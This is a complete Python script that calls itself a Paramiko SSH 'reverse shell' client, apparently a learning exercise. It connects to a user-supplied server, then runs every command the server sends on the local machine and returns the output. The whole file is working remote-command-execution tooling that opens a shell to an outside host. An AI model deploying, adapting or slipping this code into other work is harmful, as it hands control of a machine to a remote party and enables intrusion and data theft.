#!/usr/bin/env python3
# Paramiko SSH "reverse shell" client
# Connects to a Paramiko server, opens a session channel, and waits for commands.
# Runs received commands locally and sends stdout/stderr back to the server.
# Sends an initial "ClientConnected" banner so the server can log readiness.

import os
import sys
import getpass
import shlex
import socket
import platform
import subprocess
import paramiko

def run_local_command(cmd: str) -> bytes:
    """
    Execute a command locally and return combined stdout/stderr as bytes.
    On Windows, many commands are shell builtins, so we use shell=True with a string.
    On POSIX, prefer shell=False with shlex.split for safety and portability.
    """
    try:
        if os.name == "nt":
            # Windows: let the shell resolve builtins
            out = subprocess.check_output(
                cmd,
                shell=True,                  # string command
                stderr=subprocess.STDOUT
            )
        else:
            # POSIX: split args explicitly
            args = shlex.split(cmd)
            out = subprocess.check_output(
                args,
                shell=False,                 # list of args
                stderr=subprocess.STDOUT
            )
        return out or b""
    except subprocess.CalledProcessError as e:
        # Return the output
        return e.output or f"[exit {e.returncode}]".encode("utf-8", errors="replace")
    except Exception as e:
        return f"[error] {e}".encode("utf-8", errors="replace")

def ssh_command(ip: str, port: int, user: str, passwd: str, initial_msg: str = "ClientConnected") -> None:
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # demo-only

    try:
        # Defaults
        client.connect(
            ip,
            port=port,
            username=user,
            password=passwd,
            timeout=15.0,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=15.0,
            auth_timeout=15.0,
        )
    except (paramiko.SSHException, socket.error) as e:
        print(f"[-] SSH connect failed: {e}")
        return

    transport = client.get_transport()
    if transport is None or not transport.is_active():
        print("[-] No active transport after connect.")
        client.close()
        return

    # Keep the connection alive
    transport.set_keepalive(30)

    chan = None
    try:
        chan = transport.open_session(timeout=15.0)
        # Optional identify
        chan.sendall(initial_msg.encode("utf-8"))

        # If the server sends a greeting first, print it
        try:
            if chan.recv_ready():
                print(chan.recv(4096).decode("utf-8", errors="replace"), end="")
        except Exception:
            pass

        print(f"[+] Connected to {ip}:{port} as {user} ({platform.system()})")

        while True:
            # Block waiting for a command from the server
            try:
                data = chan.recv(65535)
            except socket.timeout:
                # continue waiting
                continue
            except Exception as e:
                print(f"[-] Channel recv error: {e}")
                break

            if not data:
                print("[*] Server closed the channel.")
                break

            cmd = data.decode("utf-8", errors="replace").strip()
            if not cmd:
                # ignore empty commands
                continue

            if cmd.lower() == "exit":
                chan.sendall(b"[client] bye\n")
                break

            # Execute and send back result
            output = run_local_command(cmd)
            # Append a newline so server prints cleanly
            if not output.endswith(b"\n"):
                output += b"\n"
            try:
                chan.sendall(output)
            except Exception as e:
                print(f"[-] Channel send error: {e}")
                break

    finally:
        try:
            if chan is not None:
                chan.close()
        except Exception:
            pass
        client.close()

if __name__ == "__main__":
    try:
        user = getpass.getuser()
        password = getpass.getpass("Password: ")
        ip = input("Enter server IP: ").strip() or "127.0.0.1"
        port_input = input("Enter port [2222]: ").strip()
        port = int(port_input) if port_input else 2222
    except Exception as e:
        print(f"Input error: {e}")
        sys.exit(1)

    ssh_command(ip, port, user, password, "ClientConnected")
